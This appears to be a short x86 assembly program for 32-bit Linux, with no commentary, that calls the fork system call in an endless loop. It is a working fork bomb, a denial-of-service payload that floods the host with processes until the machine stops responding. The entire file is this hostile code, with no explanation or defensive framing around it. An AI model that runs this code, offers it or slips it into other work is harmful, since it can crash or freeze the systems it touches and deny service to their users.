global _start

section .text
_start:
    push byte 2
    pop eax
    int 0x80
    jmp short _start
